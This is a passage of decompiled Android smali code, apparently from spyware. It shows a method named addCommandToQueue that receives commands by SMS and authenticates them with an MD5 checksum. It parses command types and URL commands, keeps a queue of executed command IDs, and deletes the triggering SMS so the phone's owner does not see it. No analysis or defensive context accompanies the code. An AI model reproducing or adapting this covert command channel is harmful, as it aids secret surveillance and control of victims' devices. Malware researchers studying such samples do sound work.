    invoke-direct {v3, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v6, v4, Lcom/network/android/a/a;->b:Ljava/lang/String;

    invoke-virtual {v3, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    iput-boolean p2, v4, Lcom/network/android/a/a;->i:Z

    if-nez p4, :cond_1

    invoke-static {p1}, Lcom/network/android/SmsReceiver;->b(Landroid/content/Context;)Ljava/lang/String;

    move-result-object p4

    :cond_1
    iput-object p4, v4, Lcom/network/android/a/a;->c:Ljava/lang/String;

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v6, "addCommandToQueue command token: "

    invoke-direct {v3, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v6, v4, Lcom/network/android/a/a;->c:Ljava/lang/String;

    invoke-virtual {v3, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v6, v4, Lcom/network/android/a/a;->c:Ljava/lang/String;

    invoke-virtual {v3, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    iget-object v6, v4, Lcom/network/android/a/a;->b:Ljava/lang/String;

    invoke-virtual {v3, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    iput-object v3, v4, Lcom/network/android/a/a;->d:Ljava/lang/String;

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v6, "addCommandToQueue command key (to MD5 check sum):\n"

    invoke-direct {v3, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v6, v4, Lcom/network/android/a/a;->d:Ljava/lang/String;

    invoke-virtual {v3, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const-string v3, "MD5"

    invoke-static {v3}, Ljava/security/MessageDigest;->getInstance(Ljava/lang/String;)Ljava/security/MessageDigest;

    move-result-object v3

    iget-object v6, v4, Lcom/network/android/a/a;->d:Ljava/lang/String;

    invoke-virtual {v6}, Ljava/lang/String;->getBytes()[B

    move-result-object v6

    invoke-virtual {v3, v6}, Ljava/security/MessageDigest;->update([B)V

    invoke-virtual {v3}, Ljava/security/MessageDigest;->digest()[B

    move-result-object v3

    const/16 v6, 0x8

    invoke-static {v3, v6}, Lcom/network/i/a;->a([BI)Ljava/lang/String;

    move-result-object v3

    new-instance v6, Ljava/lang/StringBuilder;

    const-string v7, "addCommandToQueue checksum: "

    invoke-direct {v6, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v7, v4, Lcom/network/android/a/a;->a:Ljava/lang/String;

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v7, " ,hash: "

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    iget-object v6, v4, Lcom/network/android/a/a;->a:Ljava/lang/String;

    invoke-virtual {v6, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_9

    move v3, v1

    :goto_0
    if-nez v3, :cond_2

    const-string v2, "addCommandToQueue not our command!!!!!!!"

    invoke-static {v2}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const/4 v2, 0x1

    const/16 v3, 0x1e

    invoke-static {v2, v3}, Lcom/network/android/c/a/b;->a(IS)V

    :goto_1
    return v0

    :catchall_0
    move-exception v0

    monitor-exit v3

    throw v0
    :try_end_2
    .catch Ljava/lang/Throwable; {:try_start_2 .. :try_end_2} :catch_0

    :catch_0
    move-exception v0

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "addCommandToQueue- "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    :goto_2
    move v0, v1

    goto :goto_1

    :cond_2
    :try_start_3
    const-string v0, "addCommandToQueue command checksam validated command"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V
    :try_end_3
    .catch Ljava/lang/Throwable; {:try_start_3 .. :try_end_3} :catch_0

    :try_start_4
    sget-object v0, Lcom/network/android/a/b;->e:Ljava/util/regex/Pattern;

    if-nez v0, :cond_3

    const-string v0, ".*[:]\\d{6}(\\d)[\n]?(.*)"

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v6, "addCommandToQueue getPatern compile: "

    invoke-direct {v3, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-static {v0}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;)Ljava/util/regex/Pattern;

    move-result-object v0

    sput-object v0, Lcom/network/android/a/b;->e:Ljava/util/regex/Pattern;

    :cond_3
    sget-object v0, Lcom/network/android/a/b;->e:Ljava/util/regex/Pattern;
    :try_end_4
    .catch Ljava/lang/Throwable; {:try_start_4 .. :try_end_4} :catch_2

    :try_start_5
    invoke-virtual {v0, v5}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;
    :try_end_5
    .catch Ljava/lang/Throwable; {:try_start_5 .. :try_end_5} :catch_3

    move-result-object v0

    move-object v3, v2

    :goto_3
    :try_start_6
    invoke-virtual {v0}, Ljava/util/regex/Matcher;->find()Z

    move-result v5

    if-eqz v5, :cond_4

    const/4 v5, 0x1

    invoke-virtual {v0, v5}, Ljava/util/regex/Matcher;->group(I)Ljava/lang/String;

    move-result-object v3

    const/4 v5, 0x2

    invoke-virtual {v0, v5}, Ljava/util/regex/Matcher;->group(I)Ljava/lang/String;

    move-result-object v2

    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "addCommandToQueue cmdType: "

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v5, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "addCommandToQueue urlCommand: "

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v5, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V
    :try_end_6
    .catch Ljava/lang/Throwable; {:try_start_6 .. :try_end_6} :catch_1

    goto :goto_3

    :catch_1
    move-exception v0

    :goto_4
    :try_start_7
    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "addCommandToQueue regx exception- "

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v5, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    :cond_4
    const/4 v0, 0x0

    invoke-virtual {v3, v0}, Ljava/lang/String;->charAt(I)C

    move-result v0

    iput-char v0, v4, Lcom/network/android/a/a;->f:C

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v3, "addCommandToQueue cmdType: "

    invoke-direct {v0, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-char v3, v4, Lcom/network/android/a/a;->f:C

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const/16 v0, 0x3d

    invoke-virtual {v2, v0}, Ljava/lang/String;->indexOf(I)I

    move-result v0

    add-int/lit8 v0, v0, 0x1

    const-string v3, "&s="

    invoke-virtual {v2, v3}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v3

    invoke-virtual {v2, v0, v3}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v0

    iput-object v0, v4, Lcom/network/android/a/a;->b:Ljava/lang/String;

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v2, "addCommandToQueue cmdMsg: "

    invoke-direct {v0, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v2, v4, Lcom/network/android/a/a;->b:Ljava/lang/String;

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    iget-char v0, v4, Lcom/network/android/a/a;->f:C

    const/16 v2, 0x30

    if-eq v0, v2, :cond_5

    iget-object v0, v4, Lcom/network/android/a/a;->b:Ljava/lang/String;

    const/16 v2, 0x26

    invoke-virtual {v0, v2}, Ljava/lang/String;->indexOf(I)I

    move-result v0

    iget-object v2, v4, Lcom/network/android/a/a;->b:Ljava/lang/String;

    const/4 v3, 0x0

    iget-object v5, v4, Lcom/network/android/a/a;->b:Ljava/lang/String;

    const/16 v6, 0x26

    invoke-virtual {v5, v6}, Ljava/lang/String;->indexOf(I)I

    move-result v5

    invoke-virtual {v2, v3, v5}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v2

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v5, "addCommandToQueue ackId id: "

    invoke-direct {v3, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    sget-object v3, Lcom/network/android/a/c;->a:Ljava/util/Vector;

    invoke-virtual {v3, v2}, Ljava/util/Vector;->add(Ljava/lang/Object;)Z

    iput-object v2, v4, Lcom/network/android/a/a;->h:Ljava/lang/String;

    invoke-static {}, Lcom/network/i/e;->b()Ljava/lang/String;

    move-result-object v2

    sput-object v2, Lcom/network/android/a/c;->b:Ljava/lang/String;

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "addCommandToQueue mommand message cmdMsg = "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v3, v4, Lcom/network/android/a/a;->b:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    iget-object v2, v4, Lcom/network/android/a/a;->b:Ljava/lang/String;

    add-int/lit8 v0, v0, 0x1

    invoke-virtual {v2, v0}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v0

    iput-object v0, v4, Lcom/network/android/a/a;->b:Ljava/lang/String;

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v2, "addCommandToQueue mommand message cmdMsg = "

    invoke-direct {v0, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v2, v4, Lcom/network/android/a/a;->b:Ljava/lang/String;

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v2, "addCommandToQueue commandAck: "

    invoke-direct {v0, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v2, v4, Lcom/network/android/a/a;->h:Ljava/lang/String;

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    :cond_5
    sget-object v2, Lcom/network/android/a/b;->d:Ljava/lang/Object;

    monitor-enter v2
    :try_end_7
    .catch Ljava/lang/Throwable; {:try_start_7 .. :try_end_7} :catch_2

    :try_start_8
    sget-object v0, Lcom/network/android/a/b;->c:Ljava/util/LinkedHashSet;

    iget-object v3, v4, Lcom/network/android/a/a;->h:Ljava/lang/String;

    invoke-virtual {v0, v3}, Ljava/util/LinkedHashSet;->contains(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_6

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v3, "addCommandToQueue cmdId= "

    invoke-direct {v0, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v3, v4, Lcom/network/android/a/a;->h:Ljava/lang/String;

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v3, " was already performed. NOT adding it to command queue"

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    monitor-exit v2

    move v0, v1

    goto/16 :goto_1

    :cond_6
    sget-object v0, Lcom/network/android/a/b;->c:Ljava/util/LinkedHashSet;

    invoke-virtual {v0}, Ljava/util/LinkedHashSet;->size()I

    move-result v0

    add-int/lit8 v0, v0, 0x1

    const/16 v3, 0x3c

    if-lt v0, v3, :cond_7

    sget-object v0, Lcom/network/android/a/b;->c:Ljava/util/LinkedHashSet;

    invoke-virtual {v0}, Ljava/util/LinkedHashSet;->iterator()Ljava/util/Iterator;

    move-result-object v3

    invoke-interface {v3}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "addCommandToQueue commandSet is full ("

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v6, Lcom/network/android/a/b;->c:Ljava/util/LinkedHashSet;

    invoke-virtual {v6}, Ljava/util/LinkedHashSet;->size()I

    move-result v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, "), remove "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-interface {v3}, Ljava/util/Iterator;->remove()V

    :cond_7
    sget-object v0, Lcom/network/android/a/b;->c:Ljava/util/LinkedHashSet;

    iget-object v3, v4, Lcom/network/android/a/a;->h:Ljava/lang/String;

    invoke-virtual {v0, v3}, Ljava/util/LinkedHashSet;->add(Ljava/lang/Object;)Z

    monitor-exit v2
    :try_end_8
    .catchall {:try_start_8 .. :try_end_8} :catchall_1

    :goto_5
    :try_start_9
    invoke-static {}, Lcom/network/b/b;->h()V

    invoke-static {p1}, Lcom/network/b/b;->c(Landroid/content/Context;)V

    if-eqz p3, :cond_8

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v2, "addCommandToQueue SystemUtils.deleteTargetSms: "

    invoke-direct {v0, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, p3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-static {p1, p3}, Lcom/network/h/b;->a(Landroid/content/Context;Ljava/lang/String;)V

    :cond_8
    sget-object v2, Lcom/network/android/a/b;->b:Ljava/lang/Object;

    monitor-enter v2
    :try_end_9
    .catch Ljava/lang/Throwable; {:try_start_9 .. :try_end_9} :catch_0

    :try_start_a
    sget-object v0, Lcom/network/android/a/b;->a:Ljava/util/Vector;

    invoke-virtual {v0, v4}, Ljava/util/Vector;->add(Ljava/lang/Object;)Z

    monitor-exit v2
    :try_end_a
    .catchall {:try_start_a .. :try_end_a} :catchall_2

    :try_start_b
    const-string v0, "addCommandToQueue end "

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V
    :try_end_b
    .catch Ljava/lang/Throwable; {:try_start_b .. :try_end_b} :catch_0

    goto/16 :goto_2

    :catchall_1
    move-exception v0

    :try_start_c
    monitor-exit v2

    throw v0
    :try_end_c
    .catch Ljava/lang/Throwable; {:try_start_c .. :try_end_c} :catch_2

    :catch_2
    move-exception v0

    :try_start_d
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "addCommandToQueue exception- "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_5

    :catchall_2
    move-exception v0

    monitor-exit v2

    throw v0
    :try_end_d
    .catch Ljava/lang/Throwable; {:try_start_d .. :try_end_d} :catch_0

    :catch_3
    move-exception v0

    move-object v3, v2

    goto/16 :goto_4

    :cond_9
    move v3, v0

    goto/16 :goto_0
.end method
